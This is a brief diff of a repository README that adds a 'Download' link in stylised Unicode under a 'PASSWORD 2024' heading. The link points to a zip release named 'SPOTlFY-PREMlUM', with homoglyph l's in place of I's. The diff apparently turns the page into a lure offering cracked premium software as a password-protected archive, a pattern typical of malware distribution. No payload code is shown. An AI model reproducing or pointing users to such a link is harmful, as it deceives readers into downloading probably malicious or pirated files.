@@ -2,7 +2,7 @@
 
 # PASSWORD 2024 
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/Amoor4/SPOTlFY-PREMlUM/releases/download/SPOTlFY-PREMlUM/SPOTlFY-PREMlUM.zip)
 
 <div align="center">
   
